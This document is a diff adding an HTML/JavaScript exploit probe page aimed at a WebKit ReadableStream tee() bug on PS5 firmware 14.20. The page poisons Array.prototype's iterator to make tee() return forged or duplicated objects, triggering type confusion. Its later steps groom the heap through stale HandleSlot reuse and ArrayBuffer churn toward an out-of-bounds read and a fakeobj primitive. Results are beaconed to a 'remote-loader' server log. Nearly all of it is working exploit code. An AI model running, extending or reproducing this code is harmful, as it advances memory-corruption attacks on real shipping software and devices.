@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>CAND-A fake-stream / private-name inversion liveness (PS5 14.20)</title>
+</head>
+<body>
+<pre id="out">CAND-A fake-stream ladder — S1 InternalReadableStream::tee escalation (DS-PSY-MAX)
+6 crash-isolated design steps, one per variant. Verdict is server-side.
+Reload #s0 (control) or #s1..#s5 to re-run ONE step after a crash.
+</pre>
+<script>
+/*
+ * CAND-A / FAKE-STREAM ladder (DS-PSY-MAX, 2026-10-15)
+ *
+ * S1 defect (LIVE on 14.20, confirmed x4): WebCore/bindings/js/InternalReadableStream.cpp
+ *   :187  auto result = tee(*globalObject, shouldClone);          // builtin readableStreamTee
+ *   :191  auto results = Detail::SequenceConverter<IDLObject>::convert(*globalObject, result);
+ *   :192  ASSERT(results.size() == 2);                            // no-op in release
+ *   :195  return std::make_pair(fromObject(jsDOMGlobalObject, *results[0].get()),
+ *                               fromObject(jsDOMGlobalObject, *results[1].get()));
+ * upstream main STILL has ASSERT-only here (fetched 2026-10-15); 43705's fix 8fd92b1 touched
+ * ONLY Modules/streams/TransformStream.cpp.  Result Type = Vector<JSC::Strong<JSC::JSObject>>
+ * (IDLTypes.h:173).  Converter<IDLObject> (JSDOMConvertObject.h:34-50) accepts ANY object.
+ *
+ * Ladder (safe -> risky). One design step per variant; each has its own try/catch:
+ *   L           page executed
+ *   U           ReadableStream missing           -> hard abort
+ *   U2          Response missing                 -> V3 skipped only
+ *   C0          controls (cleanTeeOk, respStreamOk, realStreamCancelOk)
+ *   TP-A0/B0    hook-armed control: new TransformStream() + over-yield -> EXPECT TypeError
+ *               (the known-fixed 43705 site; TypeError == our iterator IS consulted; safe)
+ *   TP-A1/B1    DESIGN A fake-stream: tee over-yield ALL plain objects (3 for 2)
+ *               -> survive, pairLen, p0 instanceof ReadableStream, p0.locked
+ *   TP-A2/B2    PRIVATE-NAME INVERSION: yield the SAME object X twice (size 2, in-bounds)
+ *               -> pair[0].cancel() and pair[1].cancel() act on one shared X.
+ *                  engine's readableStreamCancel writes private "disturbed"; readableStreamClose
+ *                  writes private "state" (ReadableStreamInternals.js:867 / :919) onto X, so the
+ *                  SECOND cancel sees state==@streamClosed and RESOLVES instead of throwing.
+ *                  Signal: firstThrow=TypeError, secondThrow=none  => pidInverted=true  (SAFE)
+ *   TP-A3/B3    INVERSION TRAVEL: wrap the poisoned tee in a Response and clone() (FetchBody.cpp:317)
+ *               -> bodyPresent/bodyIsStream, then .getReader() marker (expected clean throw)
+ *   TP-A4/B4    DESIGN B route (a): seed a clean 2-value tee (cap-2 Vector<Strong>) then run the
+ *               UNDER-YIELD tee so its 8-byte buffer reuses the freed 16-byte chunk and results[1]
+ *               reads the stale HandleSlot => wraps a real internal record.  CRASH-ORACLE.  [#s4]
+ *   TP-A5       DESIGN B route (b): ArrayBuffer-content churn then UNDER-YIELD (fakeobj attempt).
+ *               CRASH-ORACLE, runs LAST.  [#s5]
+ *
+ * Beacon protocol (identical to cve-43705-livetest.html / cand-a-tee-livetest.html):
+ *   synchronous same-origin POST /beacon/<stage>/<run>; run = per-render nonce.
+ *   Sync XHR => A is fully sent before the trigger, so "A<n> with NO B<n>/E<n>" = crash signature.
+ *   Body for B/E/Z: literal "BUGLIVE=<true|false>" at byte 0 (value at byte 8), ';'-separated fields.
+ *
+ * READING host-beacons.log:
+ *   L then U / U2           -> surface absent; verdict UNAVAILABLE
+ *   C0 cleanTeeOk=false     -> tee surface unusable; ALL verdicts inconclusive
+ *   B0 hookArmed            -> poison hook consulted; continue reading (safe control)
+ *   B0 not armed            -> hook=blunt: tee verdicts INCONCLUSIVE (do not over-read)
+ *   B1 BUGLIVE=true pidA=true (all-plain, survived) -> DESIGN A reach LIVE
+ *   B2 pidInverted=true;firstThrow=TypeError;secondThrow=none -> PRIVATE-NAME INVERSION LIVE (safe!)
+ *   B2 pidInverted=false    -> engine did not run our object as stream (inconclusive / guarded)
+ *   B3 bodyPresent=true     -> confusion travels through FetchBody::clone
+ *   A4 with NO B4/E4        -> under-yield past-end deref at :195 crashed => crash-oracle LIVE
+ *   A5 with NO B5           -> bmalloc/fakeobj groom crashed (expected if groom unsound)
+ *   B4 pidSurvived=true     -> stale-HandleSlot reuse returned a REAL record (route (a) works)
+ *   Z                       -> full safe prefix (V0..V3) completed
+ * ABORT LABELS: U (no ReadableStream), U2 (no Response), C0-controls (cleanTeeOk/respStreamOk),
+ *   hookBlunt (V0 did not throw).  Any E<n> = that step threw cleanly (guard/expected) and the
+ *   ladder CONTINUES unless it is V0 (which downgrades later verdicts).
+ */
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  function say(s) { try { out.textContent += s + "\n"; } catch (e) {} }
+
+  var run = "f" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8);
+
+  function beacon(stage, body) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/beacon/" + stage + "/" + run, false);
+      x.setRequestHeader("Content-Type", "text/plain;charset=utf-8");
+      x.send(body || "");
+    } catch (e) { /* logging must never throw */ }
+  }
+
+  function clean(s) { return String(s).replace(/[;\r\n]+/g, ",").slice(0, 200); }
+  function errStr(e) {
+    return (e && e.name) ? (e.name + "|" + clean(e.message || "")) : clean(e);
+  }
+  function bBody(buglive, n, sig, extra) {
+    return "BUGLIVE=" + (buglive ? "true" : "false") + ";n=" + n + ";sig=" + clean(sig) +
+           ";hook=" + hookState + ";extra=" + clean(extra);
+  }
+
+  var origIter = Array.prototype[Symbol.iterator];
+  var hookState = "unknown";
+
+  say("run=" + run);
+  say("UA=" + navigator.userAgent);
+  beacon("L", "page loaded; ua=" + navigator.userAgent);
+
+  /* ---- ABORT LABEL: U ---------------------------------------------------- */
+  if (typeof ReadableStream === "undefined") {
+    beacon("U", "ABORT;ReadableStream undefined;ua=" + navigator.userAgent);
+    say("ABORT U: no ReadableStream");
+    return;
+  }
+  /* ---- ABORT LABEL: U2 (soft; only V3 skipped) -------------------------- */
+  var haveResponse = (typeof Response !== "undefined");
+  if (!haveResponse) { beacon("U2", "ABORT;Response undefined;ua=" + navigator.userAgent); }
+
+  /* ---- ABORT LABEL: C0-controls ----------------------------------------- */
+  var cleanTeeOk = false, realCancelOk = false, respStreamOk = false;
+  try { cleanTeeOk = (new ReadableStream({ start: function (c) {} }).tee().length === 2); } catch (e) {}
+  try {
+    var _rs = new ReadableStream({ start: function (c) {} });
+    var _pr = _rs.cancel();
+    realCancelOk = (_pr && typeof _pr.then === "function");
+  } catch (e) {}
+  if (haveResponse) {
+    try { new Response(new ReadableStream({ start: function (c) {} })); respStreamOk = true; } catch (e) {}
+  }
+  beacon("C0", "BUGLIVE=false;CONTROL;cleanTeeOk=" + cleanTeeOk + ";realCancelOk=" + realCancelOk +
+               ";respStreamOk=" + respStreamOk);
+
+  if (!cleanTeeOk) {
+    say("ABORT C0-controls: clean tee unusable; verdicts inconclusive");
+    beacon("Z0", "BUGLIVE=false;ABORT;C0control;cleanTeeOk=false");
+    return;
+  }
+
+  /* ---- poisoned iterators (readableStreamTee returns [branch1, branch2]) -- */
+  function poisonOverYieldAllPlain() {   // V1: ignore arr, yield N plain objects (N = arr.length+1)
+    return function () {
+      var n = this.length + 1, i = 0;
+      return { next: function () {
+        if (i >= n) return { done: true };
+        return { value: { fake: i++ }, done: false };
+      }};
+    };
+  }
+  function poisonSameObjectTwice() {     // V2/V3: yield the SAME captured X twice (size 2, in-bounds)
+    var X = { marker: "fake-stream-X" };
+    return function () {
+      var i = 0;
+      return { next: function () {
+        if (i >= 2) return { done: true };
+        i++;
+        return { value: X, done: false };
+      }};
+    };
+  }
+  function poisonUnderYieldOne() {       // V4/V5: exactly 1 value for a 2-array -> results[1] OOB
+    return function () {
+      var i = 0;
+      return { next: function () {
+        if (i >= 1) return { done: true };
+        i++;
+        return { value: { fake: 0 }, done: false };
+      }};
+    };
+  }
+
+  // Runs one step: A<n> -> {poison, work, classify} -> B<n> or E<n>. Never throws out.
+  function runStep(n, desc, poison, work, classify) {
+    beacon("A" + n, "TP-A" + n + ";" + desc);
+    say("v" + n + "  " + desc);
+    var threw = null, res = null;
+    try {
+      try { Array.prototype[Symbol.iterator] = poison(); }
+      catch (e0) { threw = errStr(e0); }
+      if (threw === null) {
+        try { res = work(); }
+        catch (e1) { threw = errStr(e1); }
+      }
+    } finally {
+      try { Array.prototype[Symbol.iterator] = origIter; } catch (e2) {}   // skipped only on crash
+    }
+    var v;
+    try { v = classify(threw, res); }
+    catch (e3) { v = { kind: "B", buglive: false, sig: "classifyThrew", extra: errStr(e3) }; }
+    if (v.kind === "E") {
+      beacon("E" + n, "BUGLIVE=false;GUARD;n=" + n + ";threw=" + clean(v.extra) + ";hook=" + hookState +
+                       ";expected=" + clean(v.expected || ""));
+      say("v" + n + "  GUARD " + v.extra);
+    } else {
+      beacon("B" + n, bBody(v.buglive, n, v.sig, v.extra));
+      say("v" + n + "  " + (v.buglive ? "BUGLIVE=true" : "no-bug") + "  " + v.sig + "  " + v.extra);
+    }
+    return true;
+  }
+
+  function isTypeError(t) { return !!t && t.indexOf("TypeError") === 0; }
+
+  /* ---- V0 hook-armed control (fixed 43705 site = TransformStream) --------- */
+  function v0() {
+    return runStep(0, "hook control: new TransformStream() + over-yield (expect TypeError)",
+      poisonOverYieldAllPlain, function () {
+        var ts = new TransformStream();
+        return { r: ts.readable, w: ts.writable };
+      }, function (threw, res) {
+        hookState = isTypeError(threw) ? "armed" : "blunt";
+        return { kind: "B", buglive: false, sig: (hookState === "armed") ? "hookArmed" : "hookBlunt",
+                 extra: "threw=" + (threw || "none") };
+      });
+  }
+
+  /* ---- V1 DESIGN A: fake-stream (all-plain over-yield, safe) -------------- */
+  function v1() {
+    return runStep(1, "DESIGN A fake-stream: rs.tee() + over-yield all-plain (2 -> 3)",
+      poisonOverYieldAllPlain, function () {
+        return { pair: new ReadableStream({ start: function (c) {} }).tee() };
+      }, function (threw, res) {
+        if (threw) return isTypeError(threw) ? { kind: "E", buglive: false, extra: threw, expected: "size-guard" }
+                                             : { kind: "B", buglive: false, sig: "otherThrow", extra: threw };
+        var len = -1, inst = "n/a", locked = "n/a";
+        try { len = res.pair.length; } catch (e) {}
+        try { inst = String(res.pair[0] instanceof ReadableStream); } catch (e) { inst = "throw"; }
+        try { locked = String(res.pair[0].locked); } catch (e) { locked = "throw"; }
+        return { kind: "B", buglive: true, sig: "survived",
+                 extra: "pairLen=" + len + ";p0instanceof=" + inst + ";p0locked=" + locked +
+                        ";pidA=" + (inst === "true") };
+      });
+  }
+
+  /* ---- V2 PRIVATE-NAME INVERSION (same X twice; safe, no OOB) ------------- */
+  function v2() {
+    return runStep(2, "PRIVATE-NAME INVERSION: yield same X twice + cancel/cancel",
+      poisonSameObjectTwice, function () {
+        var pair = new ReadableStream({ start: function (c) {} }).tee();
+        var firstThrow = null, secondThrow = null, firstSig = "", secondSig = "", locked = "n/a";
+        try { pair[0].cancel(); } catch (e) { firstThrow = errStr(e); }
+        try { pair[1].cancel(); } catch (e) { secondThrow = errStr(e); }
+        try { locked = String(pair[0].locked); } catch (e) { locked = "throw"; }
+        return { firstThrow: firstThrow, secondThrow: secondThrow, locked: locked };
+      }, function (threw, res) {
+        if (threw) return { kind: "B", buglive: false, sig: "teeThrew", extra: threw };
+        var inverted = (isTypeError(res.firstThrow) && res.secondThrow === null);
+        return { kind: "B", buglive: inverted, sig: "pidInverted=" + inverted,
+                 extra: "firstThrow=" + (res.firstThrow || "none") +
+                        ";secondThrow=" + (res.secondThrow || "none") + ";p0locked=" + res.locked };
+      });
+  }
+
+  /* ---- V3 INVERSION TRAVEL through Response.clone (FetchBody.cpp:317) ----- */
+  function v3() {
+    if (!haveResponse || !respStreamOk) {
+      beacon("U2b", "V3 skipped;haveResponse=" + haveResponse + ";respStreamOk=" + respStreamOk);
+      return true;
+    }
+    return runStep(3, "INVERSION TRAVEL: new Response(stream).clone() under yield-same-X-twice",
+      poisonSameObjectTwice, function () {
+        var r = new Response(new ReadableStream({ start: function (c) {} }));
+        var r2 = r.clone();
+        var present = false, isStream = false, getReaderSig = "";
+        try { present = (r2.body !== null && r2.body !== undefined); } catch (e) {}
+        try { isStream = (r2.body instanceof ReadableStream); } catch (e) {}
+        try { r2.body.getReader(); getReaderSig = "none"; }
+        catch (e) { getReaderSig = errStr(e); }
+        return { present: present, isStream: isStream, getReaderSig: getReaderSig };
+      }, function (threw, res) {
+        if (threw) return { kind: "B", buglive: false, sig: "cloneThrew", extra: threw };
+        return { kind: "B", buglive: res.present, sig: "survived",
+                 extra: "bodyPresent=" + res.present + ";bodyIsStream=" + res.isStream +
+                        ";getReaderSig=" + res.getReaderSig };
+      });
+  }
+
+  /* ---- V4 DESIGN B route (a): stale HandleSlot reuse (CRASH-ORACLE) ------- */
+  function v4() {
+    return runStep(4, "DESIGN B(a) stale-HandleSlot reuse: seed clean 2-tee then under-yield [CRASH-ORACLE]",
+      poisonUnderYieldOne, function () {
+        // Seed: a clean 2-value conversion allocates a cap-2 Vector<Strong<JSObject>> (16-byte bmalloc
+        // chunk) holding [HandleSlot(b1), HandleSlot(b2)], then frees it. HandleSet::deallocate does
+        // NOT clear m_value (HandleSet.h:117-123), so the +8 qword is a live-ish JSValue*.
+        for (var k = 0; k < 4; k++) {
+          new ReadableStream({ start: function (c) {} }).tee();
+        }
+        // Now the under-yield tee: its 8-byte buffer should reuse the freed 16-byte chunk;
+        // results[1] reads the stale HandleSlot -> HandleTypes::getFromSlot derefs it (HandleTypes.h:36).
+        var pair = new ReadableStream({ start: function (c) {} }).tee();
+        var len = -1, locked = "n/a";
+        try { len = pair.length; } catch (e) {}
+        try { locked = String(pair[0].locked); } catch (e) { locked = "throw"; }
+        return { len: len, locked: locked };
+      }, function (threw, res) {
+        if (threw) return { kind: "B", buglive: false, sig: "survivedUnderYield", extra: "threw=" + threw };
+        return { kind: "B", buglive: false, sig: "pidSurvived=true",
+                 extra: "pairLen=" + res.len + ";p0locked=" + res.locked +
+                        ";note=stale-slot-reuse-no-crash" };
+      });
+  }
+
+  /* ---- V5 DESIGN B route (b): ArrayBuffer-content fakeobj (CRASH-ORACLE) -- */
+  function v5() {
+    return runStep(5, "DESIGN B(b) bmalloc-content fakeobj: ArrayBuffer churn then under-yield [CRASH-ORACLE, LAST]",
+      poisonUnderYieldOne, function () {
+        // Churn the 16-byte size class with content-bearing allocations, then under-yield:
+        // if the freed chunk's +8 qword is ArrayBuffer data we control, results[1].get() reads
+        // our qword as a JSValue (fakeobj).  Determinism is UNPROVEN; runs LAST behind #s5.
+        var seeds = [];
+        for (var k = 0; k < 64; k++) {
+          var u = new Uint8Array(8);
+          u[0] = 0x41;
+          seeds.push(u);
+          if (k % 8 === 0) seeds.length = 0;
+        }
+        var pair = new ReadableStream({ start: function (c) {} }).tee();
+        var len = -1;
+        try { len = pair.length; } catch (e) {}
+        return { len: len };
+      }, function (threw, res) {
+        if (threw) return { kind: "B", buglive: false, sig: "survivedUnderYield", extra: "threw=" + threw };
+        return { kind: "B", buglive: false, sig: "pidSurvived=true", extra: "pairLen=" + res.len };
+      });
+  }
+
+  var stages = [v0, v1, v2, v3, v4, v5];
+  var only = (location.hash || "").replace(/^#s?/, "");
+
+  try {
+    if (only === "0") {
+      say("control only (#s0): cleanTeeOk=" + cleanTeeOk + " realCancelOk=" + realCancelOk +
+          " respStreamOk=" + respStreamOk);
+    } else if (/^[1-5]$/.test(only)) {
+      say("single-step mode #s" + only + " (hook control skipped)");
+      stages[Number(only)]();
+    } else {
+      // Safe prefix first (V0..V3), then the two crash-oracle steps LAST.
+      v0(); v1(); v2(); v3();
+      beacon("Z", "BUGLIVE=false;SAFEPREFIX;hook=" + hookState + ";steps=4;run=" + run);
+      say("");
+      say("safe prefix done; running crash-oracles (V4/V5) last ...");
+      v4(); v5();
+      beacon("Z9", "BUGLIVE=false;ALLDONE;hook=" + hookState + ";steps=6;run=" + run);
+      say("");
+      say("done. verdict is server-side: ps5-webkit-remote-loader/host-beacons.log");
+      say("A4/A5 without B/E = crash-oracle fired. Reload #s4 / #s5 to isolate.");
+    }
+  } catch (e) {
+    say("harness error (not a verdict): " + errStr(e));
+  }
+})();
+</script>
+</body>
+</html>
